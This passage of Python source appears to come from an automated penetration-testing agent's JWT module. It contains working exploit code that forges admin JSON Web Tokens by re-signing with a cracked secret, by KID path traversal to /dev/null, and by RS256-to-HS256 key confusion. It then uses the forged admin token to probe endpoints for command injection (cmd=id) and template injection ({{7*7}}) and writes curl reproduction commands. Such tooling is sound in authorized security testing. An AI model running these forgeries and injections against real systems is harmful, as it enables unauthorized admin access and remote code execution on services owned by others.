        new_signing_input = f"{parts[0]}.{p_b64}".encode()
        new_sig = hmac.new(secret.encode(), new_signing_input, hashlib.sha256).digest()
        new_sig_b64 = base64.urlsafe_b64encode(new_sig).decode().strip('=')

        return f"{parts[0]}.{p_b64}.{new_sig_b64}"

    # ========================================
    # Post-Exploitation: Authenticated Scanning
    # ========================================

    async def _post_exploit_authenticated_scan(self, secret: str, decoded: Dict, admin_token: str, source_url: str):
        """
        After cracking JWT, probe authenticated endpoints for RCE and SSTI.

        Generic approach â€” tests common vulnerability patterns on endpoints
        that become accessible with the forged admin token.
        """
        import aiohttp
        import re
        from urllib.parse import urlparse

        logger.info(f"[{self.name}] Starting post-exploitation authenticated scan...")

        parsed = urlparse(source_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Collect candidate endpoints from recon + common paths
        endpoints = await self._collect_auth_endpoints(base)

        if not endpoints:
            logger.info(f"[{self.name}] No authenticated endpoints to probe")
            return

        logger.info(f"[{self.name}] Probing {len(endpoints)} endpoints with admin token")

        headers = {"Authorization": f"Bearer {admin_token}"}

        try:
            async with aiohttp.ClientSession() as session:
                # Phase 1: Discover which endpoints are newly accessible
                accessible = []
                for ep_url in endpoints[:30]:  # Cap at 30
                    try:
                        await self._rate_limit()
                        async with session.get(ep_url, headers=headers,
                                               timeout=aiohttp.ClientTimeout(total=5),
                                               ssl=False) as resp:
                            if resp.status == 200:
                                body = await resp.text()
                                accessible.append((ep_url, body))
                    except Exception:
                        continue

                logger.info(f"[{self.name}] {len(accessible)} endpoints accessible with admin token")

                # Phase 2: Test accessible endpoints for RCE
                for ep_url, _ in accessible:
                    await self._test_authenticated_rce(session, ep_url, headers)

                # Phase 3: Test POST endpoints for SSTI
                await self._test_authenticated_ssti(session, base, endpoints, headers)

        except Exception as e:
            logger.debug(f"[{self.name}] Post-exploitation scan error: {e}")

        post_exploit_count = len([f for f in self.findings if f.get("_post_exploit")])
        logger.info(f"[{self.name}] Post-exploitation scan complete: {post_exploit_count} additional findings")

    async def _collect_auth_endpoints(self, base_url: str) -> List[str]:
        """Collect candidate authenticated endpoints from recon data + common paths."""
        from urllib.parse import urlparse

        endpoints = set()

        # Source 1: Recon URLs
        report_dir = getattr(self, 'report_dir', None)
        if report_dir:
            urls_file = report_dir / "recon" / "urls.txt"
            if urls_file.exists():
                for line in urls_file.read_text().splitlines():
                    line = line.strip()
                    if line:
                        endpoints.add(line.split("?")[0])  # Base URL without params

        # Source 2: Common admin/protected paths
        admin_paths = [
            "/api/admin/stats", "/api/admin/users", "/api/admin/products",
            "/api/admin/orders", "/api/admin/settings", "/api/admin/config",
            "/api/admin/email-preview", "/api/admin/email-templates",
            "/api/admin/import", "/api/admin/export", "/api/admin/logs",
            "/api/admin/debug", "/api/admin/vulnerable-debug-stats",
            "/api/user/profile", "/api/user/preferences", "/api/user/settings",
            "/api/health", "/api/status", "/api/debug", "/api/internal",
            "/admin", "/dashboard", "/api/dashboard",
        ]
        for path in admin_paths:
            endpoints.add(f"{base_url}{path}")

        return list(endpoints)

    async def _test_authenticated_rce(self, session, ep_url: str, headers: Dict):
        """Test an authenticated endpoint for command injection via query params."""
        import re

        # Common command injection parameter names
        rce_params = ["cmd", "exec", "command", "shell", "run", "ping", "query", "process"]
        # Test payload â€” 'id' is safe and universal
        test_cmd = "id"
        # RCE indicators in response
        rce_indicators = [
            r"uid=\d+",          # Unix id output
            r"gid=\d+",          # Unix id output
            r"root:",            # /etc/passwd
            r"bin/\w+sh",        # Shell paths
            r"total \d+",        # ls output
            r"drwx",             # ls -l output
        ]

        for param in rce_params:
            test_url = f"{ep_url}?{param}={test_cmd}"
            try:
                await self._rate_limit()
                async with session.get(test_url, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=8),
                                       ssl=False) as resp:
                    if resp.status != 200:
                        continue
                    body = await resp.text()

                    # Check for RCE indicators
                    for pattern in rce_indicators:
                        if re.search(pattern, body):
                            # Verify it's not in the baseline (without cmd param)
                            await self._rate_limit()
                            async with session.get(ep_url, headers=headers,
                                                   timeout=aiohttp.ClientTimeout(total=5),
                                                   ssl=False) as base_resp:
                                base_body = await base_resp.text()
                                if not re.search(pattern, base_body):
                                    self.think(f"CRITICAL: RCE confirmed on {test_url}!")
                                    logger.info(f"[{self.name}] RCE CONFIRMED: {test_url}")
                                    self.findings.append({
                                        "type": "Authenticated RCE",
                                        "url": ep_url,
                                        "parameter": param,
                                        "payload": test_cmd,
                                        "evidence": f"Command injection via ?{param}={test_cmd}. Output matched: {pattern}",
                                        "severity": normalize_severity("CRITICAL").value,
                                        "cwe_id": "CWE-78",
                                        "cve_id": "N/A",
                                        "remediation": "Never pass user input directly to OS commands. Use parameterized APIs, input validation with allowlists, and avoid shell=True. Restrict admin endpoint access with strong authentication.",
                                        "validated": True,
                                        "status": "VALIDATED_CONFIRMED",
                                        "description": f"Authenticated Remote Code Execution via {param} parameter on {ep_url}. Requires admin JWT token (cracked via dictionary attack).",
                                        "reproduction": f"# Exploit RCE with forged admin JWT:\ncurl -H 'Authorization: Bearer <admin_token>' '{test_url}'",
                                        "http_request": f"GET {test_url} with admin JWT",
                                        "http_response": f"200 OK with command output matching {pattern}",
                                        "_post_exploit": True,
                                    })
                                    return  # One RCE finding per endpoint is enough
            except Exception:
                continue

    async def _test_authenticated_ssti(self, session, base_url: str, endpoints: List[str], headers: Dict):
        """Test POST endpoints for Server-Side Template Injection."""
        import re

        # Candidate POST endpoints (common patterns for template rendering)
        ssti_candidates = [
            ep for ep in endpoints
            if any(kw in ep.lower() for kw in
                   ["email", "template", "preview", "render", "report", "notify", "message", "newsletter"])
        ]

        # Also add common SSTI-prone paths not in recon
        ssti_paths = [
            f"{base_url}/api/admin/email-preview",
            f"{base_url}/api/admin/template/render",
            f"{base_url}/api/admin/preview",
            f"{base_url}/api/admin/render",
            f"{base_url}/api/template/preview",
        ]
        for sp in ssti_paths:
            if sp not in ssti_candidates:
                ssti_candidates.append(sp)

        if not ssti_candidates:
            return

        # SSTI test payloads (arithmetic evaluation)
        ssti_payload = "{{7*7}}"
        ssti_alt_payloads = ["${7*7}", "<%= 7*7 %>", "#{7*7}"]
        expected_result = "49"

        # Common body field names that might be template-rendered
        body_fields = ["body", "content", "template", "message", "text", "html", "subject"]

        for ep_url in ssti_candidates[:10]:
            for field in body_fields:
                for payload in [ssti_payload] + ssti_alt_payloads:
                    try:
                        await self._rate_limit()
                        post_body = {field: payload}
                        async with session.post(ep_url, headers=headers, json=post_body,
                                                timeout=aiohttp.ClientTimeout(total=8),
                                                ssl=False) as resp:
                            if resp.status not in (200, 201):
                                continue
                            body = await resp.text()

                            # Check for arithmetic evaluation (49 present, 7*7 not literally present)
                            if expected_result in body:
                                # Verify the literal payload is NOT in response (it was evaluated)
                                payload_literal = payload.replace("{", "").replace("}", "").replace("$", "").replace("<", "").replace(">", "").replace("%", "").replace("=", "").replace("#", "")
                                if payload_literal not in body:
                                    # Baseline check: send non-template text
                                    await self._rate_limit()
                                    async with session.post(ep_url, headers=headers,
                                                            json={field: "SAFE_TEXT_12345"},
                                                            timeout=aiohttp.ClientTimeout(total=5),
                                                            ssl=False) as base_resp:
                                        base_body = await base_resp.text()
                                        if expected_result not in base_body:
                                            self.think(f"CRITICAL: SSTI confirmed on {ep_url} field={field}!")
                                            logger.info(f"[{self.name}] SSTI CONFIRMED: {ep_url} via {field}")
                                            self.findings.append({
                                                "type": "Authenticated SSTI",
                                                "url": ep_url,
                                                "parameter": field,
                                                "payload": payload,
                                                "evidence": f"Template injection via POST {field}={payload}. Server evaluated to {expected_result}.",
                                                "severity": normalize_severity("CRITICAL").value,
                                                "cwe_id": "CWE-1336",
                                                "cve_id": "N/A",
                                                "remediation": "Never render user input as template code. Use sandboxed template engines, escape special characters, and restrict template syntax in user-controlled fields.",
                                                "validated": True,
                                                "status": "VALIDATED_CONFIRMED",
                                                "description": f"Server-Side Template Injection via {field} parameter on {ep_url}. Template payload {payload} was evaluated server-side. Requires admin JWT token.",
                                                "reproduction": f"# Exploit SSTI with forged admin JWT:\ncurl -X POST -H 'Authorization: Bearer <admin_token>' -H 'Content-Type: application/json' -d '{{\"{field}\": \"{payload}\"}}' '{ep_url}'",
                                                "http_request": f"POST {ep_url} with {field}={payload}",
                                                "http_response": f"200 OK with evaluated output containing {expected_result}",
                                                "_post_exploit": True,
                                            })
                                            return  # One SSTI finding per scan is enough
                    except Exception:
                        continue

    async def _attack_kid_injection(self, token: str, url: str, location: str):
        """KID Injection for Directory Traversal / SQLi."""
        decoded = self._decode_token(token)
        if not decoded or 'kid' not in decoded['header']:
            return

        # Simple Directory Traversal Check
        # Try to make server use /dev/null (empty content) as key
        # Requires known alg (usually HS256 if we force it, or public key confusion)
        
        # Strategy: Change kid to /dev/null, sign with empty string
        new_header = decoded['header'].copy()
        new_header['kid'] = "../../../../../../../dev/null"
        # Force symmetric algebra if possible, or assume server treats key file content as symmetric key
        
        # This is a complex attack, usually requires signing with empty string
        h_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().strip('=')
        p_b64 = token.split('.')[1]
        
        signing_input = f"{h_b64}.{p_b64}".encode()
        # Sign with empty key (content of /dev/null)
        sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')
        
        forged_token = f"{h_b64}.{p_b64}.{sig_b64}"
        
        if await self._verify_token_works(forged_token, url, location):
            self.think("SUCCESS: KID Directory Traversal confirmed (/dev/null bypass)")
            self.findings.append({
                "type": "JWT KID Injection",
                "url": url,
                "parameter": "kid",
                "payload": "../../../../../../../dev/null",
                "severity": normalize_severity("HIGH").value,
                "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
                "cve_id": "N/A",  # Vulnerability class, not specific CVE
                "remediation": get_remediation_for_vuln("JWT"),
                "validated": True,
                "status": "VALIDATED_CONFIRMED",
                "description": "JWT KID (Key ID) injection via directory traversal. The 'kid' header parameter is vulnerable to path traversal, allowing use of /dev/null as the signing key (empty content). This enables forging valid tokens.",
                "reproduction": f"# Forge JWT with KID pointing to /dev/null:\n# 1. Set kid header to '../../../../../../../dev/null'\n# 2. Sign with empty key\n# Forged token: {forged_token[:60]}...",
                "http_request": f"GET {url} with forged token (kid: /dev/null)",
                "http_response": "200 OK with token accepted"
            })

    async def _attack_key_confusion(self, token: str, url: str, location: str):
        """
        Algorithm Confusion Attack (RS256 -> HS256).
        Tries to use the server's public key as the symmetric secret.
        """
        decoded = self._decode_token(token)
        if not decoded or decoded['header'].get('alg') != 'RS256':
            return

        self.think("Attempting Key Confusion (RS256 -> HS256)...")

        # Fetch public keys
        jwks_url, public_keys = await self._key_confusion_fetch_keys(url)
        if not public_keys:
            self.think("Skipping Key Confusion: No public key found.")
            return

        # Execute attack with all keys and formats
        await self._key_confusion_execute_attack(public_keys, decoded, url, location, jwks_url)

    async def _key_confusion_fetch_keys(self, url: str) -> Tuple[str, List]:
        """Fetch public keys from JWKS endpoint."""
        from urllib.parse import urlparse

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        jwks_url = f"{base_url}/.well-known/jwks.json"

        public_keys = await self._key_confusion_download_jwks(jwks_url)
        return jwks_url, public_keys

    async def _key_confusion_download_jwks(self, jwks_url: str) -> List:
        """Download and parse JWKS keys from URL."""
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                async with session.get(jwks_url, timeout=5) as resp:
                    return await self._key_confusion_process_jwks_response(resp, jwks_url)
        except Exception as e:
            logger.debug(f"Failed to fetch JWKS: {e}")
            return []

    async def _key_confusion_process_jwks_response(self, resp, jwks_url: str) -> List:
        """Process JWKS HTTP response and parse keys."""
        if resp.status != 200:
            return []

        jwks = await resp.json()
        public_keys = self._key_confusion_parse_jwks(jwks)
        self.think(f"Found {len(public_keys)} public keys at {jwks_url}")
        return public_keys

    def _key_confusion_parse_jwks(self, jwks: Dict) -> List:
        """Parse JWK keys from JWKS response."""
        from jwt.algorithms import RSAAlgorithm

        public_keys = []
        for key in jwks.get('keys', []):
            parsed_key = self._key_confusion_parse_single_jwk(key)
            if parsed_key:
                public_keys.append(parsed_key)
        return public_keys

    def _key_confusion_parse_single_jwk(self, key: Dict):
        """Parse single JWK key."""
        from jwt.algorithms import RSAAlgorithm

        try:
            return RSAAlgorithm.from_jwk(json.dumps(key))
        except Exception as e:
            logger.debug(f"Failed to parse JWK: {e}")
            return None

    async def _key_confusion_execute_attack(self, public_keys: List, decoded: Dict, url: str, location: str, jwks_url: str):
        """Execute key confusion attack with all keys and formats."""
        from cryptography.hazmat.primitives import serialization

        formats_to_try = [
            serialization.PublicFormat.SubjectPublicKeyInfo,
            serialization.PublicFormat.PKCS1
        ]

        for key_obj in public_keys:
            for fmt in formats_to_try:
                if await self._key_confusion_test_format(key_obj, fmt, decoded, url, location, jwks_url):
                    return  # Success - stop trying

    async def _key_confusion_test_format(self, key_obj, fmt, decoded: Dict, url: str, location: str, jwks_url: str) -> bool:
        """Test single key format variant."""
        from cryptography.hazmat.primitives import serialization

        try:
            pub_key_pem = key_obj.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=fmt
            )

            forged_token = self._key_confusion_forge_token(pub_key_pem, decoded)
            self.think(f"Generated Token ({fmt.name}): {forged_token}")

            if await self._verify_token_works(forged_token, url, location):
                self._key_confusion_report_success(fmt, forged_token, url, jwks_url)
                return True

        except Exception:
            pass

        return False

    def _key_confusion_forge_token(self, pub_key_pem: bytes, decoded: Dict) -> str:
        """Forge JWT using public key as HMAC secret."""
        # Build header
        new_header = decoded['header'].copy()
        new_header['alg'] = 'HS256'
        h_b64 = base64.urlsafe_b64encode(
            json.dumps(new_header, separators=(',', ':')).encode()
        ).decode().strip('=')

        # Build payload with elevated privileges
        new_payload = decoded['payload'].copy()
        new_payload['role'] = 'admin'
        new_payload['admin'] = True
        p_json = json.dumps(new_payload, separators=(',', ':')).encode()
        p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')

        # Sign with public key as HMAC secret
        signing_input = f"{h_b64}.{p_b64}".encode()
        sig = hmac.new(pub_key_pem, signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')

        return f"{h_b64}.{p_b64}.{sig_b64}"

    def _key_confusion_report_success(self, fmt, forged_token: str, url: str, jwks_url: str):
        """Report successful key confusion attack."""
        self.think(f"SUCCESS: Key Confusion (RS256->HS256) confirmed with format {fmt}!")
        self.findings.append({
            "type": "JWT Key Confusion",
            "url": url,
            "parameter": "alg",
            "payload": "RS256->HS256 with Public Key",
            "severity": normalize_severity("CRITICAL").value,
            "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
            "cve_id": "N/A",  # Vulnerability class, not specific CVE
            "remediation": get_remediation_for_vuln("JWT"),
            "validated": True,
            "status": "VALIDATED_CONFIRMED",
            "description": f"JWT Algorithm Confusion vulnerability (RS256 to HS256). The server's public RSA key was used as an HMAC secret, allowing token forgery. Public key fetched from {jwks_url}.",
            "reproduction": f"# Key Confusion Attack:\n# 1. Fetch public key from {jwks_url}\n# 2. Change alg from RS256 to HS256\n# 3. Sign with public key PEM as HMAC secret\n# Forged token: {forged_token[:60]}...",
            "http_request": f"GET {url} with RS256->HS256 confused token",
            "http_response": "200 OK with elevated privileges"
        })

    async def _analyze_and_exploit(self, token: str, url: str, location: str):
        """Full analysis and exploitation pipeline for a single token."""
        try:
            # 1. Decode and Analyze (Passive)
            decoded = self._decode_token(token)
            if not decoded:
                return

            alg = decoded['header'].get('alg', 'unknown')
            claims = list(decoded['payload'].keys())
            self.think(f"Token Analysis: Alg={alg}, Claims={claims}")

            # 2. Execute all relevant attacks based on token properties
            # Always try 'none' algorithm bypass (works regardless of original alg)
            await self._check_none_algorithm(token, url, location)

            # Try brute force if HS256 (symmetric key)
            if alg == 'HS256':
                await self._attack_brute_force(token, url, location)

            # Try KID injection if KID header present
            if 'kid' in decoded['header']:
                await self._attack_kid_injection(token, url, location)

            # Try key confusion if RS256 (asymmetric to symmetric)
            if alg == 'RS256':
                await self._attack_key_confusion(token, url, location)

        except Exception as e:
            logger.error(f"[{self.name}] Token analysis failed: {e}", exc_info=True)

    # ========================================
    # WET â†’ DRY Two-Phase Processing (Phase A: Deduplication, Phase B: Exploitation)
    # ========================================

    async def analyze_and_dedup_queue(self) -> List[Dict]:
        """
        PHASE A: Drain WET findings from queue and deduplicate using LLM + fingerprint fallback.

        Returns:
            List of DRY (deduplicated) findings
        """
        import asyncio
        import time

        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")

        queue = queue_manager.get_queue("jwt")
        wet_findings = []

        # Wait for queue to have items (timeout 300s)
        wait_start = time.monotonic()
        while (time.monotonic() - wait_start) < 300.0:
            if queue.depth() if hasattr(queue, 'depth') else 0 > 0:
                break
            await asyncio.sleep(0.5)

        # Drain all WET findings from queue
        logger.info(f"[{self.name}] Phase A: Queue has {queue.depth() if hasattr(queue, 'depth') else 0} items, starting drain...")

        stable_empty_count = 0
        drain_start = time.monotonic()

        while stable_empty_count < 10 and (time.monotonic() - drain_start) < 300.0:
            item = await queue.dequeue(timeout=0.5)  # Use dequeue(), not get_nowait()

            if item is None:
                stable_empty_count += 1
                continue

            stable_empty_count = 0

            finding = item.get("finding", {}) if isinstance(item, dict) else {}
            if finding:
                wet_findings.append(finding)

        logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings from queue")

        if not wet_findings:
            logger.info(f"[{self.name}] Phase A: No findings to process")
            return []

        # LLM-powered deduplication
        dry_list = await self._llm_analyze_and_dedup(wet_findings, self._scan_context)

        # Store for later phases
        self._dry_findings = dry_list

        logger.info(f"[{self.name}] Phase A: Deduplication complete. {len(wet_findings)} WET â†’ {len(dry_list)} DRY ({len(wet_findings) - len(dry_list)} duplicates removed)")

        return dry_list

    async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
        """
        Use LLM to intelligently deduplicate JWT findings.
        Falls back to fingerprint-based dedup if LLM fails.
        """
        # v3.2: Extract tech stack info for prompt
        tech_stack = getattr(self, '_tech_stack_context', {}) or {}
        lang = tech_stack.get('lang', 'generic')

        # Get JWT-specific context prompts
        jwt_prime_directive = getattr(self, '_jwt_prime_directive', '')
        jwt_dedup_context = self.generate_jwt_dedup_context(tech_stack) if tech_stack else ''

        # Infer JWT library for context
        jwt_lib = self._infer_jwt_library(lang)

        prompt = f"""You are analyzing {len(wet_findings)} potential JWT vulnerability findings.

{jwt_prime_directive}

{jwt_dedup_context}

## TARGET CONTEXT
- Language: {lang}
- Likely JWT Library: {jwt_lib}

WET FINDINGS (may contain duplicates):
{json.dumps(wet_findings, indent=2)}

Return ONLY unique findings in JSON format:
{{
  "findings": [
    {{"url": "...", "token": "...", "vuln_type": "...", ...}},
    ...
  ]
}}"""

        system_prompt = f"""You are an expert JWT deduplication analyst.

{jwt_prime_directive}

Your job is to identify and remove duplicate JWT vulnerabilities while preserving unique token-based attacks. Focus on domain-level deduplication."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                system_prompt=system_prompt,
                module_name="JWT_DEDUP",
                temperature=0.2
            )

            # Parse LLM response
            result = json.loads(response)
            dry_list = result.get("findings", [])

            if dry_list:
                logger.info(f"[{self.name}] LLM deduplication successful: {len(wet_findings)} â†’ {len(dry_list)}")
                return dry_list
            else:
                logger.warning(f"[{self.name}] LLM returned empty list, using fallback")
                return self._fallback_fingerprint_dedup(wet_findings)

        except Exception as e:
            logger.warning(f"[{self.name}] LLM deduplication failed: {e}, using fallback")
            return self._fallback_fingerprint_dedup(wet_findings)

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        """
        Fallback fingerprint-based deduplication if LLM fails.
        Uses _generate_jwt_fingerprint for expert dedup.
        """
        seen = set()
        dry_list = []

        for finding in wet_findings:
            url = finding.get("url", "")
            token = finding.get("token", "")
            vuln_type = finding.get("vuln_type", finding.get("type", "JWT"))

            fingerprint = self._generate_jwt_fingerprint(url, vuln_type, token)

            if fingerprint not in seen:
                seen.add(fingerprint)
                dry_list.append(finding)

        logger.info(f"[{self.name}] Fingerprint dedup: {len(wet_findings)} â†’ {len(dry_list)}")
        return dry_list

    async def exploit_dry_list(self) -> List[Dict]:
        """
        PHASE B: Exploit all DRY findings and emit validated vulnerabilities.

        Returns:
            List of validated findings
        """
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings...")

        validated_findings = []

        for idx, finding in enumerate(self._dry_findings, 1):
            url = finding.get("url", "")
            token = finding.get("token", "")
            vuln_type = finding.get("vuln_type", finding.get("type", "JWT"))

            logger.info(f"[{self.name}] Phase B: [{idx}/{len(self._dry_findings)}] Testing {url} type={vuln_type}")

            # Check fingerprint to avoid re-emitting
            fingerprint = self._generate_jwt_fingerprint(url, vuln_type, token)
            if fingerprint in self._emitted_findings:
                logger.debug(f"[{self.name}] Phase B: Skipping already emitted finding")
                continue

            # Execute JWT attack
            try:
                result = await self._test_single_item_from_queue(url, token, finding)

                if result:
                    # Mark as emitted
                    self._emitted_findings.add(fingerprint)

                    # Ensure dict format
                    if not isinstance(result, dict):
                        result = {
                            "url": url,
                            "token": token,
                            "type": "JWT",
                            "vuln_type": vuln_type,
                            "severity": "HIGH",
                            "validated": True
                        }

                    validated_findings.append(result)

                    # Emit event with validation
                    self._emit_jwt_finding({
                        "type": "JWT",
                        "url": result.get("url", url),
                        "vulnerability_type": result.get("vuln_type", vuln_type),
                        "attack_type": result.get("vuln_type", vuln_type),
                        "severity": result.get("severity", "HIGH"),
                        "token": result.get("token", ""),
                        "evidence": result.get("evidence", {}),
                    }, scan_context=self._scan_context)

                    logger.info(f"[{self.name}] âœ“ JWT vulnerability confirmed: {url} type={vuln_type}")
                else:
                    logger.debug(f"[{self.name}] âœ— JWT vulnerability not confirmed")

            except Exception as e:
                logger.error(f"[{self.name}] Phase B: Exploitation failed: {e}")

        # FIX (2026-02-16): Capture post-exploitation findings (RCE, SSTI) that were
        # added to self.findings during authenticated scanning but not returned by
        # _test_single_item_from_queue (which only returns the last finding).
        validated_urls = {f.get("url", "") + f.get("type", "") for f in validated_findings}
        for f in self.findings:
            if f.get("_post_exploit") and (f.get("url", "") + f.get("type", "")) not in validated_urls:
                validated_findings.append(f)
                self._emit_jwt_finding({
                    "type": f.get("type", "JWT"),
                    "url": f.get("url", ""),
                    "vulnerability_type": f.get("type", "JWT"),
                    "attack_type": f.get("type", "JWT"),
                    "severity": f.get("severity", "CRITICAL"),
                    "evidence": f.get("evidence", ""),
                }, scan_context=self._scan_context)
                logger.info(f"[{self.name}] âœ“ Post-exploit finding captured: {f.get('type')} on {f.get('url')}")

        logger.info(f"[{self.name}] Phase B: Exploitation complete. {len(validated_findings)} validated findings")
        return validated_findings

    async def _generate_specialist_report(self, validated_findings: List[Dict]) -> None:
        """
        Generate specialist report for JWT findings.

        Report structure:
        - phase_a: WET â†’ DRY deduplication stats
        - phase_b: Exploitation results
        - findings: All validated JWT findings
        """
        import aiofiles

        # v3.1: Use unified report_dir if injected, else fallback to scan_context
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            scan_id = self._scan_context.split("/")[-1] if "/" in self._scan_context else self._scan_context
            scan_dir = settings.BASE_DIR / "reports" / scan_id
        # v3.2: Write to specialists/results/ for unified wetâ†’dryâ†’results flow
        results_dir = scan_dir / "specialists" / "results"
        results_dir.mkdir(parents=True, exist_ok=True)

        report = {
            "agent": f"{self.name}",
            "vulnerability_type": "JWT",
            "scan_context": self._scan_context,
            "phase_a": {
                "wet_count": len(self._dry_findings) + (len(validated_findings) - len(self._dry_findings)),  # Approximate
                "dry_count": len(self._dry_findings),
                "deduplication_method": "LLM + fingerprint fallback (netloc-only)"
            },
            "phase_b": {
                "exploited_count": len(self._dry_findings),
                "validated_count": len(validated_findings)
            },
            "findings": validated_findings,
            "summary": {
                "total_validated": len(validated_findings),
                "vuln_types_found": list(set(f.get("vuln_type", "JWT") for f in validated_findings))
            }
        }

        report_path = results_dir / "jwt_results.json"

        async with aiofiles.open(report_path, "w") as f:
            await f.write(json.dumps(report, indent=2))

        logger.info(f"[{self.name}] Specialist report saved: {report_path}")

    # ========================================
    # Queue Consumer Mode (Phase 20)
    # ========================================

    async def start_queue_consumer(self, scan_context: str) -> None:
        """
        TWO-PHASE queue consumer (WET â†’ DRY). NO infinite loop.

        Phase A: Drain ALL findings from queue and deduplicate
        Phase B: Exploit DRY list only

        Args:
            scan_context: Scan identifier for event correlation
        """
        from bugtrace.agents.specialist_utils import (
            report_specialist_start,
            report_specialist_done,
            report_specialist_wet_dry,
            write_dry_file,
        )

        self._queue_mode = True
        self._scan_context = scan_context

        # v3.2: Load context-aware tech stack for intelligent deduplication
        await self._load_jwt_tech_context()

        logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET â†’ DRY)")

        # Get initial queue depth for telemetry
        queue = queue_manager.get_queue("jwt")
        initial_depth = queue.depth()
        report_specialist_start(self.name, queue_depth=initial_depth)

        # PHASE A: Analyze and deduplicate
        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")
        dry_list = await self.analyze_and_dedup_queue()

        # Report WETâ†’DRY metrics for integrity verification
        report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)
        write_dry_file(self, dry_list, initial_depth, "jwt")

        if not dry_list:
            logger.info(f"[{self.name}] No findings to exploit after deduplication")
            report_specialist_done(self.name, processed=0, vulns=0)
            return  # Terminate agent

        # PHASE B: Exploit DRY findings
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        results = await self.exploit_dry_list()

        # Count confirmed vulnerabilities
        vulns_count = len([r for r in results if r]) if results else 0
        vulns_count += len(self._dry_findings) if hasattr(self, '_dry_findings') else 0

        # REPORTING: Generate specialist report
        if results or self._dry_findings:
            await self._generate_specialist_report(results)

        # Report completion with final stats
        report_specialist_done(
            self.name,
            processed=len(dry_list),
            vulns=vulns_count
        )

        logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")

        # Method ends - agent terminates âœ…

    async def _process_queue_item(self, item: dict) -> Optional[Dict]:
        """Process a single item from the jwt queue."""
        finding = item.get("finding", {})
        url = finding.get("url")
        token = finding.get("token")

        if not url and not token:
            logger.warning(f"[{self.name}] Invalid queue item: missing url or token")
            return None

        return await self._test_single_item_from_queue(url, token, finding)

    async def _test_single_item_from_queue(self, url: str, token: str, finding: dict) -> Optional[Dict]:
        """Test a single item from queue for JWT vulnerabilities."""
        try:
            if token:
                # Analyze provided token
                await self._analyze_and_exploit(token, url, "queue")
                if self.findings:
                    return self.findings[-1]  # Return most recent finding
            elif url:
                # Discover tokens from URL
                result = await self.check_url(url)
                if result.get("vulnerable") and result.get("findings"):
                    return result["findings"][0]
            return None
        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    def _generate_jwt_fingerprint(self, url: str, vuln_type: str, token: str = None) -> tuple:
        """
        Generate JWT finding fingerprint for expert deduplication.

        Args:
            url: Target URL
            vuln_type: Vulnerability type (e.g., "none algorithm", "weak secret")
            token: JWT token string (optional, but recommended for accurate dedup)

        Returns:
            Tuple fingerprint for deduplication
        """
        from urllib.parse import urlparse
        import hashlib

        parsed = urlparse(url)

        # JWT signature: Token-specific (netloc + vulnerability type + token hash)
        # JWT vulnerabilities are token-specific, not URL-specific
        # Different tokens on same domain can have different vulnerabilities
        if token:
            # Use first 8 chars of SHA256 hash for compact fingerprint
            token_hash = hashlib.sha256(token.encode()).hexdigest()[:8]
            fingerprint = ("JWT", parsed.netloc, vuln_type, token_hash)
        else:
            # Fallback if token not provided (backwards compatibility)
            fingerprint = ("JWT", parsed.netloc, vuln_type)

        return fingerprint

    async def _handle_queue_result(self, item: dict, result: Optional[Dict]) -> None:
        """Handle completed queue item processing."""
        if result is None:
            return

        # Determine validation status from finding
        status = self._get_validation_status(result)

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        url = result.get("url")
        token = result.get("token", "")
        vuln_type = result.get("vulnerability_type", result.get("type"))
        fingerprint = self._generate_jwt_fingerprint(url, vuln_type, token)

        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate JWT finding (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        if settings.WORKER_POOL_EMIT_EVENTS:
            self._emit_jwt_finding({
                "specialist": "jwt",
                "type": "JWT",
                "url": result.get("url"),
                "vulnerability_type": result.get("vulnerability_type", result.get("type")),
                "attack_type": result.get("vulnerability_type", result.get("type")),
                "severity": result.get("severity"),
                "token": result.get("token", ""),
                "status": status,
                "evidence": result.get("evidence", {}),
                "validation_requires_cdp": status == ValidationStatus.PENDING_VALIDATION.value,
            }, scan_context=self._scan_context)

        logger.info(f"[{self.name}] Confirmed JWT vulnerability: {result.get('vulnerability_type', result.get('type', 'unknown'))} [status={status}]")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_jwt notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        if self._worker_pool:
            await self._worker_pool.stop()
            self._worker_pool = None

        if self.event_bus:
            self.event_bus.unsubscribe(
                EventType.WORK_QUEUED_JWT.value,
                self._on_work_queued
            )

        self._queue_mode = False
        logger.info(f"[{self.name}] Queue consumer stopped")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False}

        return {
            "mode": "queue",
            "queue_mode": True,
